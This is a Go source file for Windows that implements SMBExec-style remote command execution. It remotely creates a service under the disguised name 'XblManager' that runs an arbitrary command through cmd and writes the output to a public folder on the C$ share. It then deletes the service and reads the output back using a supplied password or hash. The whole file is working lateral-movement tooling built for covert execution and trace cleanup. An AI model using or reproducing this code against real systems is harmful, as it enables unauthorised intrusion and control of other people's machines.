//go:build windows
// +build windows

package exectools

import (
	"errors"
	"fmt"
	"strings"
	"time"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/svc/mgr"
)

func DeleteService(targetMachine, serviceName string) error {
	serviceMgr, err := mgr.ConnectRemote(targetMachine)
	if err != nil {
		return err
	}
	defer serviceMgr.Disconnect()
	service, err := serviceMgr.OpenService(serviceName)
	if err != nil {
		return err
	}
	defer service.Close()
	err = service.Delete()
	if err != nil {
		return err
	}
	return nil
}

func CreateService(targetMachine, serviceName, commandToExec string) error {
	serviceMgr, err := mgr.ConnectRemote(targetMachine)
	if err != nil {
		return err
	}
	defer serviceMgr.Disconnect()
	c := mgr.Config{}
	serviceBinary := fmt.Sprintf("%%COMSPEC%% /Q /c echo %s ^> \\\\127.0.0.1\\C$\\Users\\Public\\Documents\\svc_host_log001.txt 2^>^&1 > %%TMP%%\\svc_host_stderr.cmd & %%COMSPEC%% /Q /c %%TMP%%\\svc_host_stderr.cmd & del %%TMP%%\\svc_host_stderr.cmd", commandToExec)
	c.BinaryPathName = serviceBinary
	service, err := CreateServiceWithoutEscape(serviceMgr.Handle, serviceBinary, serviceName)
	if err != nil {
		return err
	}
	defer service.Close()
	service.Start()
	return nil
}

func SmbExec(args []string) (string, error) {
	if len(args) < 4 {
		return "", errors.New("Not Enough Args.")
	}
	node := args[0]
	userName := args[1]
	userSlice := strings.Split(userName, "\\")
	if len(userSlice) < 2 {
		return "", errors.New("User Format Must Be DOMAIN\\User")
	}
	domainW := userSlice[0]
	userName = userSlice[1]
	passwordOrHash := args[2]
	command := args[3]
	/*

		If the current user does not have proper access when connecting to a service on another computer, the OpenSCManager function call fails. To connect to a service remotely,
		 call the LogonUser function with LOGON32_LOGON_NEW_CREDENTIALS
		 and then call ImpersonateLoggedOnUser before calling OpenSCManager.
		 For more information about connecting to services remotely, see Services and RPC/TCP.

	*/
	/*
		//impersonation before call
		user := syscall.StringToUTF16Ptr(userName)
		domain := syscall.StringToUTF16Ptr(domainW)
		pass := syscall.StringToUTF16Ptr(passwordOrHash)
		var hToken syscall.Handle
		res, _, err := win32.LogonUser.Call(uintptr(unsafe.Pointer(user)), uintptr(unsafe.Pointer(domain)), uintptr(unsafe.Pointer(pass)), uintptr(uint32(8)), uintptr(uint32(0)), uintptr(unsafe.Pointer(&hToken)))
		if res == 0 {
			return "", err
		}
		worked, _, err := win32.ImpersonateLoggedOnUser.Call(uintptr(hToken))
		if worked == 0 {
			return "", err
		}
		log.Println("impersonation done")
		// impersonation done
	*/
	err := CreateService(node, "XblManager", command)
	if err != nil {
		return "", err
	}
	time.Sleep(time.Second * 2)
	err = DeleteService(node, "XblManager")
	if err != nil {
		return "", err
	}
	payloadPath := `Users\Public\Documents\svc_host_log001.txt`
	data, err := ReadFileOnShare(node, userName, passwordOrHash, domainW, "C$", payloadPath)
	if err != nil {
		return "", err
	}
	return string(data), nil
}

func CreateServiceWithoutEscape(handle windows.Handle, serviceBinaryPath, serviceStartName string) (*mgr.Service, error) {
	binPath := windows.StringToUTF16Ptr(serviceBinaryPath)
	startName := windows.StringToUTF16Ptr(serviceStartName)
	h, err := windows.CreateService(handle, startName, startName, windows.SERVICE_ALL_ACCESS, 0x00000010, mgr.StartManual, mgr.ErrorIgnore, binPath, nil, nil, nil, nil, windows.StringToUTF16Ptr(""))
	if err != nil {
		return nil, err
	}
	return &mgr.Service{Name: serviceStartName, Handle: h}, nil
}
